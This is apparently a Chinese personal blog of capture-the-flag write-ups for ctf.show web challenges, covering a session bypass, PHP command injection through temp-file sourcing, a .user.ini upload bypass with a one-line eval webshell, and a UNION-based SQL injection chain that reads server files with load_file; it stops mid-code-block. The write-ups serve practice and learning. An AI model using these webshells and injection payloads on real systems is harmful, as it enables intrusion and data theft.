<h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><p> <img src="https://pic1.imgdb.cn/item/67ac634dd0e0a243d4fe97b2.png"><br> 要让password和session中的password一样  用bp抓包修改<br> <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"> <span class="attribute">GET</span> /login.php?password= HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cookie</span>: </span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;117&quot;</span>, <span class="string">&quot;Not;A=Brand&quot;</span>;v=<span class="string">&quot;8&quot;</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="number">0</span></span><br><span class="line"><span class="attribute">Sec</span>-Ch-Ua-Platform: <span class="string">&quot;macOS&quot;</span></span><br><span class="line"><span class="attribute">Upgrade</span>-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="attribute">User</span>-Agent: Mozilla/<span class="number">5</span>.<span class="number">0</span> (Windows NT <span class="number">10</span>.<span class="number">0</span>; Win64; x64) AppleWebKit/<span class="number">537</span>.<span class="number">36</span> (KHTML, like Gecko) Chrome/<span class="number">117</span>.<span class="number">0</span>.<span class="number">5938</span>.<span class="number">132</span> Safari/<span class="number">537</span>.<span class="number">36</span></span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="number">0</span>.<span class="number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0</span>.<span class="number">8</span>,application/signed-exchange;v=b3;q=<span class="number">0</span>.<span class="number">7</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Site: same-origin</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Mode: navigate</span><br><span class="line"><span class="attribute">Sec</span>-Fetch-User: ?<span class="number">1</span></span><br><span class="line"><span class="attribute">Sec</span>-Fetch-Dest: document</span><br><span class="line"><span class="attribute">Referer</span>: https://<span class="number">6187</span>d084-<span class="number">3</span>db8-<span class="number">49</span>d8-ace9-<span class="number">864432</span>c9ca24.challenge.ctf.show/</span><br><span class="line"><span class="attribute">Accept</span>-Encoding: gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept</span>-Language: zh-CN,zh;q=<span class="number">0</span>.<span class="number">9</span></span><br><span class="line"><span class="attribute">Connection</span>: close</span><br></pre></td></tr></table></figure></div><br>这里吧Cookie清空 password也清空<br>解释： <code>Session</code> <strong>通常依赖 Cookie</strong> 来存储 <code>Session ID</code>，例如：<code>setcookie(&quot;PHPSESSID&quot;, session_id(), time() + 3600, &quot;/&quot;);</code><br>当用户访问服务器时，浏览器会自动携带 <code>PHPSESSID</code>，从而服务器可以找到对应的 <code>Session</code> 数据。</p>
<h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><p><img src="https://pic1.imgdb.cn/item/67ac6350d0e0a243d4fe97b3.png"><br>查看网页源代码：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">   </span>|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|<span class="string">---</span>|</span><br><span class="line">||<span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width minimum-scale=1.0 maximum-scale=1.0 initial-scale=1.0&quot; /&gt;</span>|</span><br><span class="line">||<span class="string">&lt;title&gt;ctf.show_web12&lt;/title&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/head&gt;</span>|</span><br><span class="line">||<span class="string">&lt;body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;center&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h2&gt;ctf.show_web12&lt;/h2&gt;</span>|</span><br><span class="line">||<span class="string">&lt;h4&gt;where is the flag?&lt;/h4&gt;</span>|</span><br><span class="line">||<span class="string">&lt;!-- hit:?cmd= --&gt;</span>|</span><br><span class="line">|||</span><br><span class="line">||<span class="string">&lt;/body&gt;</span>|</span><br><span class="line">||<span class="string">&lt;/html&gt;</span>|</span><br><span class="line">|||</span><br></pre></td></tr></table></figure></div>
<p>提示输入?cmd&#x3D;   输入?cmd&#x3D;phpinfo();测试 发现可以执行这个命令 说明有远程执行漏洞<br>方法1:用一句话木马 然后用蚁剑连接 <code>cmd=@eval($_POST[%27a%27]); </code><br>但是连接进去之后报错<br><img src="https://pic1.imgdb.cn/item/67ac6357d0e0a243d4fe97bb.png"><br>这是有些网站中会禁用 php 中的一些危险函数，导致即使上传马上去，也执行不了命令，很典型的就是<strong>宝塔的网站</strong>。 下载绕过 disable_functions 插件<br>蚁剑的插件市场要访问github要在设置代理 修改成梯子的代理<br><img src="https://pic1.imgdb.cn/item/67ac6359d0e0a243d4fe97be.png"><br><img src="https://pic1.imgdb.cn/item/67ac635bd0e0a243d4fe97c1.png" alt="|500"><br>选择这个模式终于可以访问终端</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(www-data:/<span class="keyword">var</span>/www/html) <span class="variable">$ cat 903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;9fad8f78-6005-4246-8932-5ce7635a1647&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">(www-data:/<span class="keyword">var</span>/www/html) $</span><br></pre></td></tr></table></figure></div>
<p>方法2: 用php中的glob函数  glob () 函数返回匹配指定模式的文件名或目录。 输入<code>?cmd=print_r(glob(&#39;*&#39;));</code><br>可以发现有两个php文件  有信息的那个php文件看不了 所以用highlight_file () 函数，可以使文件内容高亮显示，常用于读取文件<br><code>?cmd=highlight_file(%27903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php%27);</code></p>
<p>方法3: 用<code>scandir(&#39;*&#39;);</code> 函数 和2 差不多</p>
<h1 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h1><p>查看源码 提示输入cmd 用get请求传入cmd 给出php源码<br><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>这里过滤了很多符号 只有<code>p . \ = &lt; &gt; ?</code> 和反引号没有被屏蔽</p>
<ol>
<li><p>PHP 上传机制：</p>
<p> 在 php 中，使用 <code>Content-Type: multipart/form-data;</code> 上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code> 参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code>。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 phpXXXX.tmp（Windows 中）、php**.tmp（Linux 中）。我们可以发送一个上传文件的 post 包，此时 php 会将我们上传的文件保存在临时文件夹下，默认的文件名是 &#x2F;tmp&#x2F;phpxxxxxx，文件名最后 6 个字符是随机的大小写字母。如 &#x2F;tmp&#x2F;php123abc </p>
</li>
<li><p>PHP 中反引号作用：在 php 里面反引号里面的内容会被当做 shell 命令被执行。例如 <?php echo`whoami`; ?> 会直接当作命令执行   </p>
</li>
<li><p><code>.</code> 号相当于 <code>source</code> 命令，这个命令可以直接把文件内容当作命令执行，相当于把文件直接当作 shell 脚本执行 </p>
</li>
<li><p><code>&lt;?=</code> 相当于 <code>&lt;?php ehco</code> 的简写版</p>
</li>
<li><p><code>?</code> 相当于字符的通配符</p>
</li>
<li><p><code>+</code> 相当于空格  </p>
</li>
<li><p>payload 构造</p>
</li>
</ol>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; /?cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`;</span><br><span class="line">`<span class="meta">?&gt;</span>`：闭合前面的 `<span class="meta">&lt;?php</span>` 命令</span><br><span class="line">`<span class="meta">&lt;?=</span>`：相当于 `<span class="meta">&lt;?php</span> <span class="keyword">echo</span>`</span><br><span class="line">反引号：执行命令</span><br><span class="line">`.` 相当于 `source` 命令</span><br><span class="line">`+`：相当于空格</span><br><span class="line">`?`：文字通配符，负责执行上传的临时文件</span><br></pre></td></tr></table></figure></div>
<p>payload中用了??p 替代了tmp  p?p 代替php<br>先用hackbar发送post但是不传数据 然后指定<br>发送下面请求包</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="HTTP"><figure class="iseeu highlight /http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ee6eb8bb-2686-490f-84db-a4abf42beb04.challenge.ctf.show</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua</span><span class="punctuation">: </span>&quot;Chromium&quot;;v=&quot;117&quot;, &quot;Not;A=Brand&quot;;v=&quot;8&quot;</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">Sec-Ch-Ua-Platform</span><span class="punctuation">: </span>&quot;macOS&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>244</span><br><span class="line"></span><br><span class="line"><span class="language-nix">-----------------------------<span class="number">10242300956292313528205888</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;fileUpload&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;1.txt&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> text<span class="symbol">/plain</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix"><span class="comment">#! /bin/bash</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">cat <span class="symbol">/flag.txt</span></span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>----------------------------<span class="number">1024230095629231352820588</span>8--</span></span><br></pre></td></tr></table></figure></div>
<p>我刚看到wp中的这个请求包也是一头雾水，把bp中抓的包发送到repeater中，然后修改第一行，请求方式改成POST，cmd传入payload<br>然后在Connection: close后面加上哪些参数，boundary可以自己定义。<br>使用Content-Type: multipart&#x2F;form-data</p>
<h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><p><img src="https://pic1.imgdb.cn/item/67ac63c7d0e0a243d4fe97f2.png"><br>题目这里只有一个上传文件按钮<br>如果我随便上传一个文件会显示error file zise ，说明对文件的大小有限制  并且上传界面在&#x2F;upload.php中<br>根据网上的wp，知道如果想要看源文件，一般可以从.bak .git .hg  .DS_Store 获取，所以输入&#x2F;upload.php.bak，得到源码</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p> 这里要求文件的字符数要不大于24 名字不大于9个字符 后缀不大于3个字符 而且不让上传php文件<br> 所以我们在a.txt中写入一句话木马，先<br>在 php 中 “.user.ini” 有如下解释：php 会在每个目录下搜寻文件名，如果设定为空字符串则 php 不会搜寻，也就是在 “.user.ini” 中如果设置了文件名，那么任意一个页面都将该文件中的内容包含进去。有两种方法：<br>auto_prepend_file: 在页面顶部加载文件<br>auto_append_file: 在页面底部加载文件<br>先写这个.user.ini文件并上传 然后再上传一句话木马的.txt文件</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#a.txt</span></span><br><span class="line">&lt;<span class="string">?=</span> <span class="variable">@eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);<span class="comment">#因为字符数限制，所以只能写这些</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#.user.ini</span></span><br><span class="line">auto_append_file=a.txt</span><br></pre></td></tr></table></figure></div>
<p>但是用蚁剑连接之后看不到数据，我们就用post请求传入a 用glob找到目录<br><img src="https://pic1.imgdb.cn/item/67ac63cdd0e0a243d4fe97f9.png" alt="|500"><br>然后再和web12一样用highlight_file()读取文件 (注意用单引号包裹文件)</p>
<h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;    <span class="variable">$c </span>= <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);    <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);  </span><br><span class="line">    <span class="keyword">switch</span><span class="title function_ invoke__"> </span>(<span class="variable">$c</span>) &#123;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;  </span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure></div>
<p>这里c参数选择3的时候，没有break，会继续向下执行<br>出现<code>@A@here_1s_your_f1ag.php@A@</code>提示 进入这个php 是一个登录界面<br>下一步就是sql注入了<br>查看源码 发现过滤的东西  空格也过滤了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">&lt;!--</span>|</span><br><span class="line">||<span class="string">if(preg_match(&#x27;/information_schema\.tables\</span>|<span class="string">information_schema\.columns\</span>|<span class="string">linestring\</span>|<span class="string"> \</span>|<span class="string">polygon/is&#x27;, $_GET[&#x27;query&#x27;]))&#123;</span>|</span><br><span class="line">||<span class="string">die(&#x27;@A@&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;</span>|</span><br><span class="line">||<span class="string">--&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>空格的绕过我们学过，这里没有过滤反引号<br>反引号：它是为了区分 MYSQL 的保留字与普通字符而引入的符号。<br>接下来就是sql注入的部分了：<br>1.爆库：<code>-1/**/union/**/select/**/database();</code> 得到库名web<br>2.爆表：<code>-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.</code>tables<code>/**/where/**/table_schema=database();</code> 得到表名content<br>3.爆字段：<code>-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.</code>columns<code>/**/where/**/table_name=&#39;content&#39;;</code> 得到id,username,password<br>4.爆值： <code>-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/web.content;</code><br>没有直接给出flag但是给了一些提示<br><img src="/CTFshow.assets/image-20250204223159587.png"><br>提示secret  所以访问secret.php<br>要用load_file()函数读取这个文件<br><code>-1/**/union/**/select/**/load_file(&#39;/var/www/html/secret.php&#39;)</code> 但是坑爹的是，没有直接回显，查看源码发现有多了</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GHERKIN"><figure class="iseeu highlight /gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">   </span>|</span><br><span class="line">|<span class="string">---</span>|</span><br><span class="line">|<span class="string">&lt;script&gt;alert(&#x27;&lt;!-- ReadMe --&gt;</span>|</span><br><span class="line">||<span class="string">&lt;?php</span>|</span><br><span class="line">||<span class="string">$url = &#x27;here_1s_your_f1ag.php&#x27;;</span>|</span><br><span class="line">||<span class="string">$file = &#x27;/tmp/gtf1y&#x27;;</span>|</span><br><span class="line">||<span class="string">if(trim(@file_get_contents($file)) === &#x27;ctf.show&#x27;)&#123;</span>|</span><br><span class="line">||<span class="string">echo file_get_contents(&#x27;/real_flag_is_here&#x27;);</span>|</span><br><span class="line">||<span class="string">&#125;&#x27;)&lt;/script&gt;</span>|</span><br></pre></td></tr></table></figure></div>
<p>所以再用load_file读 </p>
<h1 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h1><p>这题我感觉特别难，看着wp试着理解一下，首先这个题目给了一个登录界面，但是提示说不是sql注入需要找到关键源码。<br>扫一下网站的目录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# cat /root/tmp/reports/https_f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/__<span class="number">25-02-05_15</span>-<span class="number">07</span>-<span class="number">10</span>.txt | grep &quot;.zip&quot;</span><br><span class="line"><span class="number">200</span>     <span class="number">2</span>KB  https://f<span class="number">991d1d6</span>-f<span class="number">578-4825</span>-a048-<span class="number">004</span>c<span class="number">12279240</span>.challenge.ctf.show/vb.zip</span><br><span class="line"><span 